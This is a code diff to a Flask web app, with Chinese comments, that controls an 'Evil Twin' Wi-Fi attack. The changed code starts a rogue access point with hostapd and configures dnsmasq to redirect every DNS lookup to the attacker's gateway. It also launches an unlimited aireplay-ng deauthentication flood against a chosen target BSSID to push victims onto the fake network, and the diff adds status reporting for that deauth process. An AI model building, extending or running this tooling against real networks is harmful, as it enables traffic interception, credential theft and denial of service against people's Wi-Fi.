@@ -5,12 +5,22 @@ import subprocess
 import os
 import json
 import re
+import shutil
 import sys
+import tempfile
 from datetime import datetime
 
 app = Flask(__name__)
 DB_PATH = 'evil_twin.db'
 LOG_PATH = 'evil_twin.log'
+RUNTIME_DIR = os.path.join(
+    tempfile.gettempdir(),
+    f"evil-twin-{os.getuid() if hasattr(os, 'getuid') else os.getpid()}"
+)
+
+def runtime_path(filename):
+    os.makedirs(RUNTIME_DIR, exist_ok=True)
+    return os.path.join(RUNTIME_DIR, filename)
 
 def run_cmd(args, timeout=8):
     """Run a command and always capture stdout/stderr for diagnostics."""
@@ -49,6 +59,12 @@ def get_db():
     conn.execute("PRAGMA journal_mode=WAL")
     conn.execute("PRAGMA synchronous=NORMAL")
     return conn
+
+def ensure_config_target_bssid_column(conn):
+    cols = [row['name'] for row in conn.execute("PRAGMA table_info(config)").fetchall()]
+    if 'target_bssid' not in cols:
+        conn.execute("ALTER TABLE config ADD COLUMN target_bssid TEXT DEFAULT ''")
+        conn.commit()
 
 def get_default_route_ifaces():
     r = run_cmd(['ip', 'route', 'show', 'default'], timeout=5)
@@ -233,12 +249,14 @@ def macs_page():
 def manage_config():
     """获取/更新SSID配置"""
     conn = get_db()
+    ensure_config_target_bssid_column(conn)
     
     if request.method == 'GET':
         conn.close()
         ensure_valid_network_interface()
         conn = get_db()
-        config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase FROM config WHERE id = 1').fetchone()
+        ensure_config_target_bssid_column(conn)
+        config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase, target_bssid FROM config WHERE id = 1').fetchone()
         conn.close()
         return jsonify(dict(config))
     
@@ -310,6 +328,7 @@ def get_status():
     return jsonify({
         'hostapd': hostapd_running,
         'dnsmasq': dnsmasq_running,
+        'deauth': get_deauth_status(),
         'timestamp': datetime.now().isoformat()
     })
 
@@ -580,7 +599,7 @@ def get_diag():
     """诊断：hostapd日志、进程状态、已连接设备"""
     hostapd_log = ''
     try:
-        with open('/tmp/hostapd.log') as f:
+        with open(runtime_path('hostapd.log')) as f:
             hostapd_log = f.read()[-1000:]
     except:
         hostapd_log = '(无日志)'
@@ -662,17 +681,9 @@ def start_evil_twin():
     
     # 获取配置
     conn = get_db()
-    config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase FROM config WHERE id = 1').fetchone()
-    try:
-        target_bssid = config['target_bssid'] if config['target_bssid'] else ''
-    except:
-        target_bssid = ''
-        # 自动加列
-        try:
-            conn.execute("ALTER TABLE config ADD COLUMN target_bssid TEXT DEFAULT ''")
-            conn.commit()
-        except:
-            pass
+    ensure_config_target_bssid_column(conn)
+    config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase, target_bssid FROM config WHERE id = 1').fetchone()
+    target_bssid = config['target_bssid'] if config and config['target_bssid'] else ''
     conn.close()
     
     evil_ssid = config['evil_ssid']
@@ -703,7 +714,12 @@ wpa_passphrase={passphrase}
 wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
 """
-    with open('/tmp/hostapd.conf', 'w') as f:
+    hostapd_conf_path = runtime_path('hostapd.conf')
+    dnsmasq_conf_path = runtime_path('dnsmasq.conf')
+    hostapd_log_path = runtime_path('hostapd.log')
+    dnsmasq_log_path = runtime_path('dnsmasq.log')
+
+    with open(hostapd_conf_path, 'w') as f:
         f.write(hostapd_conf)
     
     # 3. 配置dnsmasq (DNS劫持)
@@ -715,7 +731,7 @@ dhcp-option=6,192.168.4.1
 address=/#/192.168.4.1
 dhcp-authoritative
 """
-    with open('/tmp/dnsmasq.conf', 'w') as f:
+    with open(dnsmasq_conf_path, 'w') as f:
         f.write(dnsmasq_conf)
     
     # 4. 设置网卡IP
@@ -735,11 +751,11 @@ dhcp-authoritative
     # 5. 启动服务
     run_cmd(['sudo', 'pkill', '-9', 'dnsmasq'])
     run_cmd(['sudo', 'systemctl', 'stop', 'systemd-resolved'])  # 清理残留
-    with open('/tmp/hostapd.log', 'w') as hp_log:
-        subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'],
+    with open(hostapd_log_path, 'w') as hp_log:
+        subprocess.Popen(['sudo', 'hostapd', hostapd_conf_path],
                         stdout=hp_log, stderr=subprocess.STDOUT)
-    with open('/tmp/dnsmasq.log', 'w') as dm_log:
-        subprocess.Popen(['sudo', 'dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d', '--log-facility=/tmp/dnsmasq.log'],
+    with open(dnsmasq_log_path, 'w') as dm_log:
+        subprocess.Popen(['sudo', 'dnsmasq', '-C', dnsmasq_conf_path, '-d', '--log-facility=-'],
                         stdout=dm_log, stderr=subprocess.STDOUT)
     
     import time
@@ -747,21 +763,51 @@ dhcp-authoritative
     if not is_process_running('hostapd'):
         err = ''
         try:
-            with open('/tmp/hostapd.log') as f:
+            with open(hostapd_log_path) as f:
                 err = f.read()[-500:]
         except:
             pass
         return {'status': 'error', 'message': 'hostapd 启动失败', 'stderr': err}
     
     # 启动 deauth（踢人）
+    deauth_status = {
+        'configured': bool(target_bssid),
+        'running': False,
+        'target_bssid': target_bssid,
+        'tool_available': shutil.which('aireplay-ng') is not None,
+        'message': '未配置目标BSSID',
+    }
     if target_bssid and len(target_bssid) == 17:
-        subprocess.Popen(['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid, iface],
+        proc = subprocess.Popen(['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid, iface],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(0.2)
+        deauth_status['running'] = proc.poll() is None or is_process_running('aireplay-ng')
+        if deauth_status['running']:
+            deauth_status['message'] = 'deauth运行中'
+        elif deauth_status['tool_available']:
+            deauth_status['message'] = 'deauth未能启动，请检查网卡模式和权限'
+        else:
+            deauth_status['message'] = 'deauth未能启动，请检查 aireplay-ng/aircrack-ng 是否安装'
+    elif target_bssid:
+        deauth_status['message'] = '目标BSSID格式无效'
     
-    return {'status': 'success', 'message': f'Evil Twin "{evil_ssid}" 已启动'}
+    return {'status': 'success', 'message': f'Evil Twin "{evil_ssid}" 已启动', 'deauth': deauth_status}
 
 def is_process_running(name):
     return run_cmd(['pgrep', name], timeout=5).returncode == 0
+
+def get_deauth_status():
+    conn = get_db()
+    ensure_config_target_bssid_column(conn)
+    config = conn.execute('SELECT target_bssid FROM config WHERE id = 1').fetchone()
+    conn.close()
+    target_bssid = config['target_bssid'] if config and config['target_bssid'] else ''
+    return {
+        'configured': bool(target_bssid),
+        'running': is_process_running('aireplay-ng'),
+        'target_bssid': target_bssid,
+        'tool_available': shutil.which('aireplay-ng') is not None,
+    }
 
 def stop_evil_twin(iface_override=None):
     """停止Evil Twin攻击"""
